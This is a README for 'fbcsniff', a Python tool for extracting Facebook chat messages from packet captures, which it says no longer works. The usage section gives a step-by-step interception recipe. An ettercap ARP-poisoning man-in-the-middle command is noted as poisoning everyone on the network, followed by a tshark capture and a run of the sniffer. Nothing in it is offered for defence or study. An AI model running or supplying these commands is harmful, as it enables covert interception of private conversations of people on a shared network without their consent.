# FBCSNIFF: Facebook Chat Sniffer

> Extract facebook chat messages from a pcap file

## THIS DOES NOT WORK ANYMORE!

### Deps:

``` sh
$ sudo apt-get install python-dpkt
```

### Options:

```
usage: python fbcsniff.py [OPTIONS] -c <pcap file>

-c <pcap file>
-f <msg filter> (comma separated)
-s <sleep time> (use with -l)
-o <output file>
-l (keep looking for new messages)
-h (show this message)
```

### Usage Example:

I'm using ettercap and tshark

``` sh
$ sudo apt-get install ettercap tshark
```

Start a MITM attach using ettercap **(this will poison EVERYONE!)**:

``` sh
$ sudo ettercap -T -M arp -i <your interface> // // -p auto_add
```

Start tshark capture:

``` sh
$ sudo -i
$ tshark -i <your interface> -w /tmp/capture.pcap
```

Start pulling messages out of the capture file:

``` sh
$ sudo ./fbcsniff.py -l -c /tmp/capture.py
```


